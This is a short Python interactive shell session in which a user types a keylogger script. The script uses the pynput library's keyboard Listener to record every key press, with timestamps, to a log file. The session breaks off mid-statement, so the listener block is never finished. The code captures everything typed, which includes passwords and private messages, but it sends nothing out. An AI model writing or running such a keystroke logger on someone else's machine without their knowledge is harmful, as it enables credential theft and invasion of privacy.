Python 3.12.10 (tags/v3.12.10:0cc8128, Apr  8 2025, 12:21:36) [MSC v.1943 64 bit (AMD64)] on win32
Enter "help" below or click "Help" above for more information.
>>> import pynput
... from pynput.keyboard import Key, Listener
... import logging
... 
... log_dir = "/tmp/"
... logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
... 
... def on_press(key):
...     logging.info(str(key))
... 
... with Listener(on_press=on_press) as listener:
